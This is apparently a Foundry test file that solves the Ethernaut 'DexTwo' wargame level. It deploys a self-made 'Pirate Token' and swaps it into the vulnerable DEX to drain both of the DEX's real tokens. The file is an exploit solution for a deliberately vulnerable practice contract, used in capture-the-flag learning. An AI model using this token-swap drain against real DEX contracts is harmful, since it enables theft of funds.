// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/levels/23-DexTwo/DexTwo.sol";
import "../src/levels/23-DexTwo/DexTwoFactory.sol";

contract DexTwoTest is Test {
    Ethernaut public ethernaut;
    DexTwoFactory public dexTwoFactory;
    DexTwo public dexTwo;
    address internal levelAddr;

    address attacker = address(0x1);

    function setUp() public {
        vm.deal(attacker, 10_000 ether);

        ethernaut = new Ethernaut();
        dexTwoFactory = new DexTwoFactory();
        ethernaut.registerLevel(dexTwoFactory);

        vm.startPrank(attacker);
        levelAddr = ethernaut.createLevelInstance(dexTwoFactory);
        dexTwo = DexTwo(payable(levelAddr));
    }

    function testAttack() public {
        address token1 = dexTwo.token1();
        address token2 = dexTwo.token2();

        IERC20 maliciousToken = new SwappableTokenTwo(
            attacker,
            "Pirate Token",
            "PTK",
            1000
        );

        maliciousToken.approve(address(dexTwo), 100);
        maliciousToken.transfer(address(dexTwo), 100);
        dexTwo.swap(address(maliciousToken), token1, 100);

        maliciousToken.approve(address(dexTwo), 200);
        dexTwo.swap(address(maliciousToken), token2, 200);

        bool success = ethernaut.submitLevelInstance(payable(levelAddr));
        assertTrue(success, "Solution is not solving the level");
    }
}
